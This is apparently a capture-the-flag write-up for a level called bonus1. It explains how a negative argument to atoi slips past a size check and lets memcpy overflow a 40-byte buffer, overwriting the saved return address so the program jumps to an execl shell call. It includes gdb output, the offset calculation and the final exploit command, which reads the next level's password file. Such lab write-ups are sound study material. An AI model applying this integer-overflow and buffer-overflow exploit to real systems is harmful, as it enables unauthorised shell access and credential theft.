# bonus1

This one is shorter. Indeed, there's just the `main` function.  

There is a `buffer[40]` and an int `nb` declared. We pass our argv[1] to `atoi`, and give the return to `nb`. 
Then, it checks if `nb` is less than 10. If it is, there is a call to `memcpy` which copies `nb * 4` bytes of argv[2] in our buffer.  
And if our `nb` is equal to 1464814662, it `execl` a bash.  
But how can we do that? Indeed, 1464814662 is not less than 10!

But, we notice that we can use `memcpy` in order to overflow our buffer and write what we want! And what do we want?  
We want to replace the adress of $eip by this address : `0x08048482`, where the parameters for the call to `execl` are prepared. 

How we can proceed step by step :

Need to know where to write. For that, we need to find the difference between the address of $eip and the beginning of our buffer.

  - Address of $eip :
```
(gdb) r -1 lollll
Starting program: /home/user/bonus1/bonus1 -1 lollll
Breakpoint 1, 0x08048427 in main ()
(gdb) x/4x $ebp 
0xbffff728:	0x00000000	0xb7e454d3	0x00000003	0xbffff7c4
                                ^^^^^^^^^^
x/x $ebp+4
0xbffff72c:	0xb7e454d3
^^^^^^^^^^

```
  - Buffer address : 
```
  [...]
    0x08048464 <+64>:	lea    0x14(%esp),%eax
->  0x08048468 <+68>:	mov    %ecx,0x8(%esp)
  [...]

Breakpoint 2, 0x08048468 in main ()
(gdb) x/x $eax
0xbffff6f4:	0x00000016
^^^^^^^^^^
```
  - Difference :
```
(gdb) p 0xbffff72c-0xbffff6f4
$3 = 56
```

Then, we need to find a negative number that, when multiplied by 4 is close to 60 (56 + 4 address bytes) in order to overflow. For that, we just need to do `INT_min + 60 / 4 = -2147483633` (we wrote a script to find that out).

So we have all stuff we need to write our command : 
```bash 
./bonus1 -2147483633 $(python -c 'print "A" * 56 + "\x08\x04\x84\x82"[::-1]')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
```
